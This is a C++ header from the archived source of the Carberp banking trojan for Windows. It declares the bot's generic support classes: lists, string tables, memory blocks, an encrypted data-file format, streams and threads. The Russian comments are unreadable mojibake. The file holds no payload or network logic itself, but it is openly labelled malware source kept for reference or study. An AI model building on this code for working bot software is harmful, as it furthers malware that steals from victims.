/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef BotClassesH
#define BotClassesH


//---------------------------------------------------------------------------

#include <windows.h>
#include "GetApi.h"
#include "Crypt.h"
#include "Strings.h"
#include "Memory.h"



class TBotStream;



//********************************************************************
// ������ ������ ���������. �������� ������� C++
//********************************************************************
template <class TItem>
class TListTemplate : public TBotObject
{
private:
	int    FCount;
	int    FCapacity;
	TItem* FItems;
	TItem  FEmptyItem;

	bool UpdateCapacity();
	bool CheckIndex(int Index);
protected:
	void virtual DoDelete(TItem Item);
public:
	TListTemplate();
	~TListTemplate();

	int   Add(TItem Item);
	int   Count();
	void  Clear();
	void  Delete(int Index);
	int   IndexOf(TItem Item);
	int   Remove(TItem Item);
	TItem GetItem(int Index);
	void  SetItem(int Index, TItem Item);
	bool  SetCapacity(int Value);

	TItem  operator[](int Index);
};

// ���������� ������� �������� � ������ ������
#include "ListTemplate.cpp"


typedef TListTemplate<void*> TCustomList;


class TBotList;


typedef void (*TListNotifyEvent)(TBotList*, LPVOID);


//********************************************************************
// TBotList - ������ ����������
//********************************************************************
class TBotList : public TCustomList
{
protected:
	void DoDelete(void* Item);
public:
	TBotList();
	~TBotList();
	TListNotifyEvent OnDelete;
};


//------------------------------------------------------
//  ������ ���������� ������� ��� ���������� ���������
//  ��� ��� ���������������� � Builder C++
//------------------------------------------------------
//#define TList TBotList





//********************************************************************
//	TBotStrings - ������ �����
//********************************************************************
class TBotStrings : public TBotObject
{
private:
	TBotList FItems;
    int    PutStr(string *Str);
	bool   IsName(const string& S, DWORD* NameEnd, DWORD* ValueStart);
	int    SearchName(const char* Name, string* Value);
	string MakeValueString(const char* Name, const char* Value);
public:
	string ValueDelimeter;

	TBotStrings();
	~TBotStrings();

	int    Add(const char*   Value);
	int    Add(const string& Value);
	int    AddValue(const char* Name, const char* Value);
	int    AddValue(const char* Name, const string &Value);
	int    AddValue(const string &Name, const string &Value);
	int    Count();
	void   Clear();
	void   Delete(int Index);
	int    IndexOf(const char* Str);
	int    IndexOf(const string &Str);
	string GetItem(int Index);
	void   SetItem(int Index, const char* Item);
	void   SetItem(int Index, const string &Item);
	void   SetText(const char* Text);
	void   SetText(const string &Text);
	void   SetDelimetedText(const char* Text, const char* Delimeter);
	string GetText();
    string GetDelimetedText(const  char* Delimeter);
	string NameByIndex(int Index);
	string ValueByIndex(int Index);
	string        GetValue(const char* Name);
	string inline GetValue(const string& Name) { return GetValue(Name.t_str()); }
	void   SetValue(const char* Name, const char* Value);
	void   SaveToStream(TBotStream* Stream);
	void   LoadFromStream(TBotStream* Stream);
	string inline operator[](int Index) { return GetItem(Index); }
};


//-----------------------------------------------------------------------------
//                         ����������!!!!!
//
/*----------------  ������ ��� ������ �� �������� ��������� -----------------*/

typedef LPVOID PList;

typedef void (*TFreeItemMethod)(LPVOID);

namespace List
{
	// ������� �������� ������
	PList Create();

	// ������� ����������� ������
	void Free(PList List);

	// ������� ������� ������
	void Clear(PList List);

	// ������� ���������� ���������� ��������� ������
	DWORD Count(PList List);

	// ������� ��������� ����� �������
	int Add(PList List, LPVOID Item);

	// ������� ������� ������� �� ������
	void Delete(PList List, DWORD Index);

	// ������� �� ������ �������
	int Remove(PList List, LPVOID Item);

	// ������� �������
	 LPVOID Extract(PList List, DWORD Index);

	// ������� ���������� ������� �������� � ������
	int IndexOf(PList List, LPVOID Item);

	// ������� ������������� �������� �������� � ��������� ������� Index
	void SetItem(PList List, DWORD Index, LPVOID Item);

	// ������� ���������� �������� �������� �� ������� Index
	LPVOID GetItem(PList List, DWORD Index);

	// �������� ������ ������������������ ���������
	bool SetCapacity(PList List, DWORD Value);

	// ���������� ����� ��������������� �������� ���������
	void SetFreeItemMehod(PList List, TFreeItemMethod Method);

	// ������� ���������� ��������� ������� ������
	LPVOID Last(PList List);

	// ������� �������� �������� �� ������ Source � ������ Destination
    void CopyFrom(PList Destination, PList Source);
}


// ----------------------------------------------------------------------------
//  Strings - ����� ������� ��� ������ �� �������� �����
//
//
//  ��������� ��� �������������
//
//  /* TODO : �� ����������� ���������� � ������� �� TBotStrings */
// ----------------------------------------------------------------------------

typedef LPVOID PStrings;

namespace Strings
{
	// ������� ����� �����
	PStrings Create();

	// ���������� ����� �����
	void Free(PStrings Strings);

	// �������� ����� �����
	void Clear(PStrings Strings);

	// �������� ���������� �����
	DWORD Count(PStrings Strings);

	// �������� ����� ������/
	// �� ��������� ������ �����������. ����� ��������� ��� �����
	// ���������� Duplicate = false. ������ Str ������ ���� �������
	// ���������� StrNew ���� StrAlloc
	// � ���� ������ ������ ����� �������� � ������
	// � ���������� ������ ������ ����� �������� ������ �����!!!
	int Add(PStrings Strings, PCHAR Str, bool Duplicate = true);

	// ������� ������ �� �������
	PCHAR GetItem(PStrings Strings, DWORD Index, bool DuplicateStr = true);

	// ���������� ��� ������ � ����. ���� �� ������
	// ����������� �� ����������� ����������� �������� � ����������
	PCHAR GetText(PStrings Strings, PCHAR LineDelimeter = NULL);

	// ������� ��������� ����� �� ������ ���������� ��������� �����
	// ������ � �������� �������
	void SetText(PStrings Strings, PCHAR Text);

	// ������� ������ � ������� Index
	void Delete(PStrings Strings, DWORD Index);

	// ������� ������� ������ Str �� ������
	int Remove(PStrings Strings, PCHAR Str);

	// ������� ���������� ������� ������ Str � ������
	int IndexOf(PStrings Strings, PCHAR Str);

	// �������� � ������ ���� ���=��������.
	// ���� �� ������ ����������� �� ����� ���� �� �������� ������ (�� ��������� =)
	int AddValue(PStrings Strings, PCHAR Name, PCHAR Value, PCHAR Delimeter = NULL);
}
//----------------------------------------------------------------------------------------------------





//---------------------------------------------------------------------------
//  MEMBLOCKS - ������� ��� ������ � ������� ������, �������� ������
//---------------------------------------------------------------------------
typedef struct TMemBlock
{
	DWORD ID;    // ������������� �����, ��������������� ��� ������ � ����
	DWORD Size;
	LPVOID Data;
}*PMemBlock;

typedef LPVOID PMemBlockList;

namespace MEMBLOCK
{
	// ������� ������ ������
	PMemBlockList CreateList();

	// ���������� ������ ������
	void FreeList(PMemBlockList List);

	// �������� ����� ���� � ������
    PMemBlock AddBlock(PMemBlockList List, LPVOID Data, DWORD DataSize, bool Copy = true);

	// ���������� ���� ������. �����!!!! ������ ������������ ������ �����, �� ��
	// ������� ���� �� ������ (���� �� � ��� ���������);
	void FreeBlock(PMemBlock Block);

	// ������� ������������ ����� ������ ������ ���� ������ ������
	DWORD Size(PMemBlockList List);

	// ������� �������� ������ ���� ������ � ����� Buf.
	// ���������������, ��� Buf ����� �������� � ���� ��� �����
    void BuildToBuf(PMemBlockList List, LPVOID Buf);

	// ������� �������� ��� ����� � ������
	PCHAR BuildAsStr(PMemBlockList List, DWORD *TotalSize);

	// ������� �������� ��� ����� � ������
	LPVOID BuildAsMem(PMemBlockList List, DWORD *TotalSize);

	// ������� ���������� ����� � ����
	PMemBlock Pack(PMemBlockList List);

	// ������� ������ ������ ���� � ������ ���� ���� � ��������� ���������������
	bool ContainBlock(PMemBlockList List, DWORD ID);

	// �������� ���� �� ��������������
	PMemBlock GetBlockByID(PMemBlockList List, DWORD ID);
	PCHAR GetBlockByAsStr(PMemBlockList List, DWORD ID);
}


//------------------------------------------------------
//  ������� ��������� �����
//------------------------------------------------------
#pragma pack(push, 1)
struct TFileHeader
{
	DWORD Signature;  // ��������� �����
	DWORD Version;    // ������ �����
};
#pragma pack(pop)


//---------------------------------------------------------------------------
//  DataFile - ������ ��� ������ � ������� �������
//---------------------------------------------------------------------------

#pragma pack(push, 1)
typedef struct TDataFileHead
{
	DWORD Signature;  // ��������� �����
	DWORD Version;    // ������ �����
	DWORD FileID;     // ������������� �����
	DWORD Flags;      // ����� �����
	DWORD FlagsEx;    // �������������� �����
} *PDataFileHead;
#pragma pack(pop)


enum TFileCryptMode {fcNone, fcBlock, fcFile};

typedef struct TDataFileRec
{
	HANDLE Handle;              // ������������� �����
	TDataFileHead Head;         // ��������� �����
	TFileCryptMode CryptMode;   // ����� ���������� ������ �����
	TCryptMethod CryptMethod;   // ����� �����������
	TCryptMethod DecryptMethod; // ����� ����������� ������
	LPVOID CryptKey;            // ���� ����������
	PMemBlockList Blocks;       // ������ ������
	PCHAR FileName;
} *PDataFile;



// ������� ���������� DWORD �� ������ ���������
#define SIGNATURE(Pointer) (*(DWORD*)Pointer)

namespace DataFile
{
	// ������� ������ ���� � ������ FileName, ������ ��������� ��������
	// ����� �� ��� ���� ������ � ���� �� ����������
    PDataFile CreateDataFile(PCHAR FileName, DWORD Signature);

	// ������� ��������� ���� ��� ������ � ������ �� ���� ���������
	PDataFile OpenFile(PCHAR FileName, DWORD Signature);

	// ���������� ������ �� ��������� File � ���������� ����
	bool WriteDataFile(PDataFile File);

	// ������ ������ �� ����������� ����� � ��������� File
	bool ReadDataFile(PDataFile File);

	// ������� ��������� ���� � ���������� ��������� File
    void CloseFile(PDataFile File);

	// �������� ���� ������
	void AddDataBlock(PDataFile File, DWORD BlockID, LPVOID Data, DWORD DataSize, bool Copy = true);
	void AddDataBlock(PDataFile File, DWORD BlockID, PCHAR StrData);

	// �������� ����� ������ � ����
	bool WriteBlocksToFile(PDataFile File);

	// �������� ����� ������ � ����
	bool ReadBlocksFromFile(PDataFile File);

	// ����������� ����� ������
    bool CryptBlocks(PMemBlockList Blocks, LPVOID Key, TCryptMethod Method);
}




//**********************************************************
//  TLock - ������ ����� � ���������� ������. ��������
//          ���� � ���, ��� ��� ������������� �� ������ �
//			����������� ������ ������� ����������� ������.
//          ��� ������ �� ���� ��������� ���������� ������
//			����� ������������� ��������� � � ����������� ��
//			������ �� ����������� ������
//
//  ������������ ������ ����������� ���������� �������
//**********************************************************
class TLock
{
private:
	PRTL_CRITICAL_SECTION FSection;
public:

	TLock(PRTL_CRITICAL_SECTION Section);
	~TLock();

	TLock operator=(const TLock &Locker);
	TLock operator=(PRTL_CRITICAL_SECTION Section);
};



//--------------------------------------------------
//  TEventContainer - �����, ��������� �������
//--------------------------------------------------

typedef void (*TBotEvent)(LPVOID Sender, int EventId, LPVOID EventData, LPVOID Param);

class TEventContainer : public TBotObject
{
private:
	TBotList *FEvents;
	RTL_CRITICAL_SECTION FLock;
protected:
	TLock inline GetLock() { return &FLock; }
public:
    TEventContainer();
	~TEventContainer();

	int  AttachEvent(int EventId, TBotEvent Event, LPVOID EventData);
	void DetachEvent(int EventIndex);
	void virtual CallEvent(int EventId, LPVOID Param);
	void CallEvent(int EventId);
};




//----------------------------------------------------
//  ������ �������� ������� ������� � ������
//  SEEK_ORIGIN...
//----------------------------------------------------
#define SO_BEGIN     FILE_BEGIN
#define SO_CURRENT   FILE_CURRENT
#define SO_END       FILE_END

//**********************************************************
//  TBotStream - ������� ����� ������\������
//**********************************************************
class TBotStream : public TBotObject
{
public:
	DWORD virtual Size();
	void  virtual SetSize(DWORD NewSize);
	DWORD virtual Seek(int Count, DWORD SeekMethod);
	DWORD virtual Write(const void* Buf, DWORD Count);
	DWORD virtual Read(void* Buf, DWORD Count);

	DWORD Position();
	void  SetPosition(DWORD NewPosition);

	DWORD WriteString(const char* Str);
	DWORD WriteString(const string &Str);
	DWORD WriteSizedString(const char* Str);
	DWORD WriteSizedString(const string &Str);

	LPVOID ReadToBuf(DWORD *Size);
	string ReadToString();
	int    ReadInt();
	BYTE   ReadByte();
	string ReadString(DWORD Size);
	string ReadSizedString();  // ������ ������ ������� [DWORD: ������][������]
};


//**********************************************************
// TBotMemoryStream - ����� ������/������ ������ ��
//                    ����������� ����� ������
//**********************************************************
class TBotMemoryStream : public TBotStream
{
private:
    bool   FAssigned;
	LPBYTE FMemory;
	DWORD  FSize;
	DWORD  FPosition;
	DWORD  FCapacity;
	void   SetPointer(LPBYTE Ptr, DWORD Size);
	LPBYTE Realloc(DWORD &NewCapacity);
    void   SetCapacity(DWORD NewCapacity);
public:
	TBotMemoryStream(LPVOID Mem, DWORD MemSize);
	TBotMemoryStream();
	~TBotMemoryStream();

	DWORD Read(void* Buf, DWORD Count);
	DWORD Write(const void* Buf, DWORD Count);

	DWORD Size();
	void  SetSize(DWORD NewSize);

	DWORD Seek(int Count, DWORD SeekMethod);

	LPVOID Memory();
};





//**********************************************************
//  ������ �������� ������.
//**********************************************************
static const BYTE fcmRead      = 0;
static const BYTE fcmWrite     = 1 ;
static const BYTE fcmReadWrite = 2;
static const WORD fcmCreate    = 0xFF00;


//**********************************************************
//  TBotFileStream - ����� ������\������ ������ �����
//**********************************************************
class TBotFileStream : public TBotStream
{
private:
	HANDLE FHandle;
public:
	TBotFileStream(const char* FileName, WORD Mode);
	~TBotFileStream();
	bool Valid();
	void Close();
	DWORD Size();
    void  SetSize(DWORD NewSize);
	DWORD Seek(int Count, DWORD MoveMode);
	DWORD Write(const void* Buf, DWORD Count);
	DWORD Read(void* Buf, DWORD Count);
	HANDLE inline Handle() { return FHandle; }
};


//**********************************************************
//  TBotCollection - �������� ���������
//**********************************************************
class TBotCollectionItem;

class TBotCollection : public TBotObject
{
private:
	TBotList FItems;
    PRTL_CRITICAL_SECTION FLock;
	void InsertItem(TBotCollectionItem* Item);
	void RemoveItem(TBotCollectionItem* Item);

	friend class TBotCollectionItem;
protected:
	void Lock();
	void Unlock();
public:
	TBotCollection();
	~TBotCollection();


	void virtual Clear();
	void  SetThreadSafe();
	int   Count();
	TLock GetLocker();
	TBotCollectionItem* Items(int Index);
	inline TBotCollectionItem* operator [](int Index) { return Items(Index); }
};


//**********************************************************
//  TBotCollectionItem - ������� ���������
//**********************************************************
class TBotCollectionItem : public TBotObject
{
private:
	TBotCollection* FOwner;

	friend class TBotCollection;
protected:
	void Lock();
	void Unlock();
public:
	TBotCollectionItem(TBotCollection* aOwner);
	~TBotCollectionItem();

	TBotCollection* Owner();
	void            SetOwner(TBotCollection* aOwner);
};



//**********************************************************
//  TValues - ����� ����������� ��������
//**********************************************************

class TValue : public TBotCollectionItem
{
public:
	TValue(TBotCollection* aOwner) : TBotCollectionItem(aOwner) {};
	string Name;
	string Value;
};


class TValues : public TBotCollection
{
protected:
	  TValue* GetItemByName(const char* Name);
public:
	TValues();

	void AddValue(const string &Name, const string &Value);
	void SetValue(int Index, const string &Value);
	void SetValue(const char* Name, const string &Value);

	string GetValue(int Index);
	string GetValue(const char *Name);

    inline TValue* Items(int Index) { return (TValue*)((TBotCollection*)this)->Items(Index); }

};






#define  DATA_FILE_SIGNATURE 0x3878C167 /* BOT_DATA_FILE */
#define  DATA_FILE_VERSION   0x00010000 /* 1.0 */


// ������� ���� ������
#define BLOCK_TYPE_VARIABLE 0xFF01 /* ��� ���������� */
#define BLOCK_TYPE_TEXT     0xFF02 /* ��������� ���� */
#define BLOCK_TYPE_FILE     0xFF03 /* ����           */
#define BLOCK_TYPE_DELETED  0xFFFF /* �������� ���� */



//************************************************************
//
//************************************************************
class TDataBlock : public TValue
{
private:
	bool   FDataAssigned;
	LPVOID FData;
	DWORD  FSize;
protected:

	// ������ ������/������ ������
	bool WriteBuf(LPVOID Buf, DWORD BufSize, bool Crypt, bool Hash);
	bool ReadBuf(LPVOID Buf, DWORD BufSize, bool Crypt, bool Hash);

	// ������ ������/������ ������ �����
	bool virtual WriteHeader();
	bool virtual WriteData();
	bool virtual ReadHeader();
	bool virtual ReadData();
public:
	DWORD  Type;  // ��� �����
    string Name;  // ��� �����

	TDataBlock();
	~TDataBlock();
	LPVOID inline Data() { return FData; }
	DWORD  inline Size() { return FSize; }

//    bool SaveToStream(TBotStream *Stream);
};


//************************************************************
//  TDataFile - ���� �������� ������ � ����� �  �������
//              �������
//  ��������� �����:
//  [��������� �����: TFileHead][��������� ������: TDataHead]
//  [��������� �����][������ �����]...{������ �����}
//************************************************************
class TDataFile : public TBotObject
{
private:
	TBotStream *FStream;
	bool FStreamAssigned;
	bool WriteHeaders();
	bool ReadHeaders();
	bool WriteBlock(const TDataBlock &Block);
    bool ReadBlock(const TDataBlock &Block);
protected:
	bool Write(const void* Buf, DWORD BufSize, bool Encrypt = true, bool Hash = true);
	bool Read(void* Buf, DWORD BufSize, bool Decrypt = true, bool Hash = true);
	DWORD GetVarID();
public:
	DWORD  Signature; // ��������� �����
	DWORD  Version;   // ������ �����
	DWORD  Type;      // ��� ������
	DWORD  Flags;     // ����� (���������������� ��� ���. ����)
	DWORD  FlagsEx;   // ����� (���������������� ��� ���. ����)
	string Name;      // ��� ������ ������

	TDataFile();
	~TDataFile();

	bool Create(const char* FileName);
	bool Create(TBotStream *Stream);

	bool Open(const char* FileName);
	bool Open(TBotStream *Stream);

	bool Add(WORD Type, const char *Name, LPVOID Data, DWORD DataSize);

    void Close();
};



//*******************************************************************
//  TBotThread - �����, ���������� ��� ��� ��� ������ � �������
//*******************************************************************
class TBotThread : public TBotObject
{
private:
	bool   FTerminated;
	HANDLE FHandle;
	DWORD  FId;
    void Execute();


    friend DWORD WINAPI __BotThreadProcedure(LPVOID Owner);
protected:
	void virtual DoExecute();
    bool virtual Terminated();
public:
	TBotThread(bool StartThread);
	virtual ~TBotThread();
	void virtual Terminate();
	void Start();
    void Wait();
    HANDLE Handle();
};


//---------------------------------------------------------------------------
#endif
